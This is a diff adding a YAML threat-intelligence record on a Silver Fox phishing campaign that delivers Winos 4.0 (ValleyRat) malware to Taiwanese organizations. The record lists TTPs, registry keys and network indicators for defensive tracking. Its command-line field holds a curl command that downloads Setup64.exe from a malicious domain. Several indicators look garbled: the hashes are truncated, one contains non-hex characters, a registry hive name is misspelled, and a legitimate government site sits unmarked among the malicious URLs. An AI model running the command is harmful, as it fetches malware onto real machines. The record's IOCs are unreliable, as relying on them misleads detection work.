@@ -1,0 +1,64 @@
+description: Silver Fox APT group uses Winos 4.0 (ValleyRat) to target organizations
+  in Taiwan through phishing campaigns with malicious LNK files and DLL sideloading.
+attribution: Silver Fox
+malware_families:
+- Winos 4.0
+- ValleyRat
+TTPs:
+  processes:
+  - cmd.exe
+  - DeviceCredentialDeployment.exe
+  - Setup64.exe
+  - wsftprm.sys
+  commandline:
+  - ..\..\..\..\Windows\System32\cmd.exe
+  - curl.exe -o Setup64.exe http://bqdrzbyq.cn/Setup64.exe
+  powershell: []
+  scripting_engine:
+  - Bash
+  registry_keys:
+  - SYSTEM\\CurrentControlSet\\Control\\CI\\Config
+  - SYSTEM\\CurrentControlSet001\\Control\\CI\\Config
+  - HKEY_CURRENT_USER\Console\lv&@
+  - 'HKEY_CLASSES_RQOT #(Default)'
+  - 'HKEY_CURRENT_USER #19ebbdcfdee...'
+  - 'AppEvents #311167e3c94...'
+  - 'Console #432af87cle3d...'
+  - cSe86actcbs...
+  image_load:
+  - wsftprm.sys
+  - ntdll.dll
+  network_connections:
+  - Setup64.exe -> bqdrzbyq.cn:80
+  - Winos 4.0 -> 47.76.86.151:80
+  file_activity:
+  - C:\\ProgramData\\Golden\\EXPAND
+  - '%public%\\501\\url.exe'
+  - C:\\Users\\Administrator\\Desktop\\()\\x64\\Release\\DLL.pdb
+  persistence: []
+  process_relations:
+  - cmd.exe -> Setup64.exe
+IOCs:
+  hashes:
+  - 22d33F351ad4ae...
+  - Hf81702de@22...
+  ip_addresses:
+  - 47.76.86.151
+  - 154.91.64.246
+  domains:
+  - bqdrzbyq.cn
+  - twmoi2002.tos-cn-shanghai.volces.com
+  - njhwuyklw.com
+  - sdfw2026024.tos-cn-shanghai.volces.com
+  - twtaxgo.cn
+  urls:
+  - http://taxfnat.tw/
+  - https://twmoi2002.tos-cn-shanghai.volces.com/E-Invoice.rar
+  - https://www.einvoice.nat.gov.tw/
+  - https://njhwuyklw.com/
+  - https://sdfw2026024.tos-cn-shanghai.volces.com/E-Invoice.rar
+authors:
+- Cara Lin
+reference: https://www.fortinet.com/blog/threat-research/massive-winos-40-campaigns-target-taiwan
+date_of_publication: February 20, 2026
+file_creation_date: February 21, 2026
